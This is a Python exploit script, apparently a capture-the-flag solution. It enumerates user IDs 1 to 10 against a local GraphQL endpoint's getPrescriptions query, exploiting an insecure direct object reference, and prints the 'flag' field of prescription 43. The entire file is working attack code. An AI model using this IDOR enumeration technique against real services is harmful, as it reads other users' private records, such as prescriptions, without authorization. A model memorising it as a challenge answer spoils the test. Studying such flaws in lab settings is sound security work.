#!/usr/bin/env python3
import sys
import os
import json
import argparse
import urllib.request
import urllib.parse


def gql_post(url: str, query: str, timeout: int = 10) -> bytes:
    payload = json.dumps({"query": query}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read()


def gql_get(url: str, query: str, timeout: int = 10) -> bytes:
    qs = urllib.parse.urlencode({"query": query})
    sep = "&" if ("?" in url) else "?"
    full_url = f"{url}{sep}{qs}"
    with urllib.request.urlopen(full_url, timeout=timeout) as resp:
        return resp.read()


def find_flag_by_id(obj: dict, prescription_id: int = 43):
    try:
        items = obj["data"]["getPrescriptions"]
    except Exception:
        return None
    # Prefer the specific prescription id (43 by default)
    for it in items:
        if it.get("id") == prescription_id:
            return it.get("flag")
    # Fallback: return the first non-empty flag if exact id not found
    for it in items:
        flag = it.get("flag")
        if flag:
            return flag
    return None


def try_user_ids(url: str, user_ids):
    query_tpl = (
        "query { getPrescriptions(userId: %d) { id userId prescriptionDetails flag } }"
    )
    for uid in user_ids:
        q = query_tpl % uid
        # Try POST first, then GET fallback
        for method in ("POST", "GET"):
            try:
                raw = gql_post(url, q) if method == "POST" else gql_get(url, q)
                data = json.loads(raw.decode("utf-8"))
            except Exception:
                continue
            flag = find_flag_by_id(data, prescription_id=43)
            if flag:
                return uid, flag
    return None, None


def try_urls(urls, user_ids):
    for url in urls:
        uid, flag = try_user_ids(url, user_ids)
        if flag:
            return url, uid, flag
    return None, None, None


def main():
    parser = argparse.ArgumentParser(description="Extract flag via GraphQL IDOR.")
    parser.add_argument(
        "--url",
        default=None,
        help=(
            "GraphQL endpoint URL. If omitted, tries TARGET_URL env, "
            "then http://ip5003/graphql, then http://localhost:5003/graphql"
        ),
    )
    parser.add_argument(
        "--user-id",
        type=int,
        default=None,
        help="Specific userId to query (default: brute-force 1..max)",
    )
    parser.add_argument(
        "--max",
        dest="max_id",
        type=int,
        default=10,
        help="Max userId for brute force when --user-id not set (default: 10)",
    )

    args = parser.parse_args()

    # Build candidate URLs list
    candidates = []
    if args.url:
        candidates.append(args.url)
    else:
        env_url = os.environ.get("TARGET_URL")
        if env_url:
            candidates.append(env_url)
        candidates.append("http://ip5003/graphql")
        candidates.append("http://localhost:5003/graphql")

    user_ids = [args.user_id] if args.user_id is not None else list(range(1, args.max_id + 1))

    url, uid, flag = try_urls(candidates, user_ids)
    if flag:
        print(flag)
        return 0

    print("No flag found", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
